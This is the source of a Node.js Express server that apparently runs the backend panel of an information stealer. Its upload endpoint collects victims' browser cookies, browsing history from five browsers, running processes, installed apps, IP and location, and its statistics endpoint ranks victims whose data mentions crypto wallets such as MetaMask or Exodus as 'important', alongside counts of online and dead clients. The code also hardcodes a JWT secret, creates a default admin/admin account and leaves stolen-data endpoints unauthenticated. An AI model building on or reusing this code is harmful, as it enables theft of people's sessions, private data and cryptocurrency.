require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3001;
const JWT_SECRET = process.env.JWT_SECRET || '69b98337d00be3ceca424b4032f5cb86912be404e521287af185c7482178536f572858b39493b7a5a62d9f305dd3bc230683144444ae37a627a43133ba541a45';

// Define path for storing logs
const DATA_FILE = path.join(__dirname, 'logs.json');

app.use(cors());
app.use(express.json({ limit: '50mb' })); // Increase JSON payload limit
app.use(express.urlencoded({ limit: '50mb', extended: true })); // Increase URL-encoded payload limit

let logs = []; // Initialize logs array

// Function to read logs from file
const readLogs = () => {
    console.log(`Checking for ${DATA_FILE}...`);
    if (fs.existsSync(DATA_FILE)) {
        console.log(`${DATA_FILE} found. Reading data...`);
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        logs = JSON.parse(data);
        console.log(`Logs loaded from file. ${logs.length} entries found.`);
    } else {
        console.log(`${DATA_FILE} not found. Initializing with empty logs.`);
        logs = [];
    }
};

// Function to write logs to file
const writeLogs = () => {
    fs.writeFileSync(DATA_FILE, JSON.stringify(logs, null, 2), 'utf8');
    console.log(`Logs written to ${DATA_FILE}. Total entries: ${logs.length}.`);
};

// --- Dummy Data Generation (now unused for initial load) ---
const generateDummyLogs = () => {
    console.log("Generating dummy logs (this should only happen if explicitly called elsewhere now).");
    logs = [];
    for (let i = 1; i <= 20; i++) {
        logs.push({
            id: `log-${i}-${Date.now()}`,
            ip: `192.168.1.${i}`,
            country: i % 2 === 0 ? 'USA' : 'Canada',
            date: new Date(Date.now() - i * 3600000).toISOString(), // Past logs
            dataSummary: {
                historyEntries: Math.floor(Math.random() * 100),
                processes: Math.floor(Math.random() * 50),
                installedApps: Math.floor(Math.random() * 30),
                cookies: Math.floor(Math.random() * 200),
            },
            pcData: {
                locationInfo: {
                    latitude: 34.052235 + Math.random(),
                    longitude: -118.243683 + Math.random(),
                    city: 'Los Angeles',
                    region: 'CA',
                    country: i % 2 === 0 ? 'USA' : 'Canada',
                },
                browserHistory: Array.from({ length: Math.floor(Math.random() * 20) }, (_, j) => ({
                    timestamp: new Date(Date.now() - j * 60000).toISOString(),
                    url: `https://example.com/history/${j}`,
                    title: `Example History Page ${j}`,
                })),
                browserCookies: Array.from({ length: Math.floor(Math.random() * 30) }, (_, j) => ({
                    name: `cookie${j}`,
                    value: `value${j}`,
                    domain: `example.com`,
                })),
                installedApps: Array.from({ length: Math.floor(Math.random() * 15) }, (_, j) => ({
                    name: `App ${j}`,
                    version: `${j}.0.0`,
                    installDate: new Date(Date.now() - j * 86400000).toISOString(),
                })),
                runningProcesses: Array.from({ length: Math.floor(Math.random() * 10) }, (_, j) => ({
                    imageName: `process${j}.exe`,
                    pid: 1000 + j,
                    sessionName: `Console`,
                    sessionNum: 1,
                    memUsage: `${Math.floor(Math.random() * 100)} MB`,
                })),
            },
        });
    }
};

readLogs(); // Read logs on server start
console.log(`Server initialized. Current logs array has ${logs.length} entries.`);

// User storage file
const USERS_FILE = path.join(__dirname, 'users.json');

// Function to read users from file
const readUsers = () => {
    if (fs.existsSync(USERS_FILE)) {
        try {
            const data = fs.readFileSync(USERS_FILE, 'utf8');
            return JSON.parse(data);
        } catch (error) {
            console.error('Error reading users file:', error);
            return [];
        }
    }
    return [];
};

// Function to write users to file
const writeUsers = (users) => {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
};

// Initialize users - create default admin user if no users exist
const initializeUsers = () => {
    let users = readUsers();
    
    if (users.length === 0) {
        // Create default admin user with hashed password
        const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD || 'admin';
        const hashedPassword = bcrypt.hashSync(defaultPassword, 10);
        
        users = [
            {
                username: process.env.DEFAULT_ADMIN_USERNAME || 'admin',
                passwordHash: hashedPassword,
                createdAt: new Date().toISOString()
            }
        ];
        writeUsers(users);
        console.log(`Default admin user created. Username: ${users[0].username}, Password: ${defaultPassword}`);
        console.log('⚠️  IMPORTANT: Change the default password in production!');
    }
    
    return users;
};

let users = initializeUsers();

// Authentication middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
        return res.status(401).json({ message: 'Access token required' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Invalid or expired token' });
        }
        req.user = user;
        next();
    });
};

// API Endpoints
// Authentication endpoint
app.post('/api/auth/login', (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ message: 'Username and password are required' });
        }

        // Reload users from file (in case they were updated)
        users = readUsers();
        
        // Find user by username
        const user = users.find(u => u.username === username);

        if (!user) {
            return res.status(401).json({ message: 'Invalid username or password' });
        }

        // Verify password
        const passwordValid = bcrypt.compareSync(password, user.passwordHash);
        
        if (!passwordValid) {
            return res.status(401).json({ message: 'Invalid username or password' });
        }

        // Generate JWT token
        const token = jwt.sign(
            { username: user.username, id: user.username },
            JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        // Log successful login
        console.log(`User ${username} logged in successfully at ${new Date().toISOString()}`);

        res.json({
            success: true,
            token: token,
            username: username,
            message: 'Login successful'
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Logout endpoint
app.post('/api/auth/logout', authenticateToken, (req, res) => {
    res.json({ success: true, message: 'Logged out successfully' });
});

// User management endpoints (protected)
app.post('/api/auth/register', authenticateToken, (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ message: 'Username and password are required' });
        }

        if (password.length < 6) {
            return res.status(400).json({ message: 'Password must be at least 6 characters' });
        }

        users = readUsers();

        // Check if user already exists
        if (users.find(u => u.username === username)) {
            return res.status(400).json({ message: 'Username already exists' });
        }

        // Hash password and create user
        const passwordHash = bcrypt.hashSync(password, 10);
        const newUser = {
            username,
            passwordHash,
            createdAt: new Date().toISOString()
        };

        users.push(newUser);
        writeUsers(users);

        console.log(`New user created: ${username}`);
        res.json({ success: true, message: 'User created successfully' });
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.post('/api/auth/change-password', authenticateToken, (req, res) => {
    try {
        const { oldPassword, newPassword } = req.body;
        const username = req.user.username;

        if (!oldPassword || !newPassword) {
            return res.status(400).json({ message: 'Old password and new password are required' });
        }

        if (newPassword.length < 6) {
            return res.status(400).json({ message: 'New password must be at least 6 characters' });
        }

        users = readUsers();
        const user = users.find(u => u.username === username);

        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Verify old password
        if (!bcrypt.compareSync(oldPassword, user.passwordHash)) {
            return res.status(401).json({ message: 'Incorrect old password' });
        }

        // Update password
        user.passwordHash = bcrypt.hashSync(newPassword, 10);
        writeUsers(users);

        console.log(`Password changed for user: ${username}`);
        res.json({ success: true, message: 'Password changed successfully' });
    } catch (error) {
        console.error('Change password error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.get('/api/logs', (req, res) => {
    res.json(logs);
});

app.post('/api/upload', (req, res) => {
    try {
        console.log("Received upload request. req.body:", JSON.stringify(req.body, null, 2));
        const pcData = req.body; // pcData is the entire request body from Kotlin
        const ip = pcData.ipAddress || 'Unknown';
        const country = pcData.location?.countryName || 'Unknown';
        const dateTime = pcData.dateTime || new Date().toISOString();

        // Data transformation for browserCookies
        let transformedBrowserCookies = [];
        if (pcData && pcData.browserCookies && typeof pcData.browserCookies === 'string') {
            try {
                // Assuming browserCookies is a JSON string of an array of objects
                transformedBrowserCookies = JSON.parse(pcData.browserCookies);
            } catch (parseError) {
                console.error("Error parsing browserCookies string:", parseError);
                // Fallback if parsing fails, maybe keep original or set empty
                transformedBrowserCookies = []; 
            }
        } else if (pcData && pcData.browserCookies) {
            // If it's already an array or another format, use directly
            transformedBrowserCookies = pcData.browserCookies;
        }

        // Calculate dataSummary
        let totalHistoryEntries = 0;
        if (pcData && pcData.browserHistory) {
            totalHistoryEntries += pcData.browserHistory.chromeHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.firefoxHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.edgeHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.operaHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.braveHistory?.length || 0;
        }

        const dataSummary = {
            historyEntries: totalHistoryEntries,
            processes: pcData?.runningProcesses?.length || 0,
            installedApps: pcData?.installedApps?.length || 0,
            cookies: transformedBrowserCookies.length || 0,
        };

        const newLog = {
            id: `log-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
            ip: ip,
            country: country,
            date: dateTime, // Use the extracted dateTime
            dataSummary,
            pcData: {
                ...pcData,
                browserCookies: transformedBrowserCookies, // Use transformed cookies
            },
        };

        logs.push(newLog);
        writeLogs(); // Persist changes

        res.status(200).send('Log received and saved');
    } catch (error) {
        console.error("Error processing uploaded log:", error);
        res.status(500).send('Error processing log');
    }
});



app.get('/api/logs/:logId', (req, res) => {
    const { logId } = req.params;
    const log = logs.find(l => l.id === logId);
    if (log) {
        res.json(log);
    } else {
        res.status(404).send('Log not found');
    }
});

app.post('/api/logs/delete', (req, res) => {
    try {
        const { logIds } = req.body;
        if (!Array.isArray(logIds)) {
            return res.status(400).send('logIds must be an array');
        }

        const initialLength = logs.length;
        logs = logs.filter(log => !logIds.includes(log.id));
        const deletedCount = initialLength - logs.length;

        if (deletedCount > 0) {
            writeLogs(); // Persist changes
            res.status(200).json({ message: `Deleted ${deletedCount} log(s)`, deletedCount });
        } else {
            res.status(404).send('No logs found to delete');
        }
    } catch (error) {
        console.error("Error deleting logs:", error);
        res.status(500).send('Error deleting logs');
    }
});

app.get('/api/stats', (req, res) => {
    const totalLogs = logs.length;
    
    // Simple heuristic for online/dead clients:
    // Consider a client "online" if it has sent a log in the last 5 minutes.
    // Consider a client "dead" if it hasn't sent a log in the last 1 hour.
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();

    const uniqueIps = new Set(logs.map(log => log.ip));
    const allClients = uniqueIps.size;

    const onlineClients = new Set(logs.filter(log => log.date > fiveMinutesAgo).map(log => log.ip)).size;
    const deadClients = new Set(logs.filter(log => log.date < oneHourAgo).map(log => log.ip)).size;

    res.json({
        online: onlineClients,
        all: allClients,
        dead: deadClients,
        totalLogs: totalLogs,
    });
});

app.get('/api/statistics', (req, res) => {
    console.log('Statistics endpoint hit!');
    try {
        const totalLogs = logs.length;
        
        // Calculate country distribution
        const countryCounts = {};
        logs.forEach(log => {
            const country = log.country || 'Unknown';
            countryCounts[country] = (countryCounts[country] || 0) + 1;
        });
        
        // Sort countries by count
        const countryDistribution = Object.entries(countryCounts)
            .map(([country, count]) => ({ country, count }))
            .sort((a, b) => b.count - a.count);

        // Calculate log trends (last 30 days)
        const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
        const dailyLogs = {};
        
        logs.forEach(log => {
            const logDate = new Date(log.date);
            if (logDate >= thirtyDaysAgo) {
                const dateKey = logDate.toISOString().split('T')[0]; // YYYY-MM-DD
                dailyLogs[dateKey] = (dailyLogs[dateKey] || 0) + 1;
            }
        });

        // Create array of daily log counts for last 30 days
        const last30Days = [];
        for (let i = 29; i >= 0; i--) {
            const date = new Date();
            date.setDate(date.getDate() - i);
            const dateKey = date.toISOString().split('T')[0];
            last30Days.push({
                date: dateKey,
                count: dailyLogs[dateKey] || 0
            });
        }

        // Calculate important logs (logs with crypto-related data)
        const cryptoKeywords = ['crypto', 'bitcoin', 'wallet', 'exodus', 'electrum', 'coinbase', 'metamask', 'binance'];
        let importantLogs = 0;
        let regularLogs = 0;

        logs.forEach(log => {
            const hasCrypto = log.pcData && (
                (log.pcData.browserHistory && JSON.stringify(log.pcData.browserHistory).toLowerCase().match(cryptoKeywords.join('|'))) ||
                (log.pcData.browserCookies && JSON.stringify(log.pcData.browserCookies).toLowerCase().match(cryptoKeywords.join('|'))) ||
                (log.pcData.installedApps && log.pcData.installedApps.some(app => 
                    cryptoKeywords.some(keyword => app.name.toLowerCase().includes(keyword))
                ))
            );
            
            if (hasCrypto) {
                importantLogs++;
            } else {
                regularLogs++;
            }
        });

        // Calculate totals for different data types
        let totalHistoryEntries = 0;
        let totalCookies = 0;
        let totalProcesses = 0;
        let totalApps = 0;

        logs.forEach(log => {
            if (log.dataSummary) {
                totalHistoryEntries += log.dataSummary.historyEntries || 0;
                totalCookies += log.dataSummary.cookies || 0;
                totalProcesses += log.dataSummary.processes || 0;
                totalApps += log.dataSummary.installedApps || 0;
            }
        });

        // Client status
        const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
        const uniqueIps = new Set(logs.map(log => log.ip));
        const allClients = uniqueIps.size;
        const onlineClients = new Set(logs.filter(log => log.date > fiveMinutesAgo).map(log => log.ip)).size;
        const deadClients = new Set(logs.filter(log => log.date < oneHourAgo).map(log => log.ip)).size;

        res.json({
            totalLogs,
            allClients,
            onlineClients,
            deadClients,
            countryDistribution,
            last30Days,
            importantLogs,
            regularLogs,
            totals: {
                historyEntries: totalHistoryEntries,
                cookies: totalCookies,
                processes: totalProcesses,
                apps: totalApps
            }
        });
    } catch (error) {
        console.error("Error calculating statistics:", error);
        res.status(500).send('Error calculating statistics');
    }
});

app.get('/api/download/:logId', (req, res) => {
    // In a real application, you would zip the data and send it.
    // For this dummy server, we'll just send a text file.
    const { logId } = req.params;
    const log = logs.find(l => l.id === logId);
    if (log) {
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename=${logId}_data.zip`);
        res.send(`Dummy ZIP content for log ${logId}`);
    } else {
        res.status(404).send('Log not found for download');
    }
});

// Serve static files from the React app (AFTER API routes)
app.use(express.static(path.join(__dirname, 'client/build')));

// Handle React routing, return all requests to React app
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});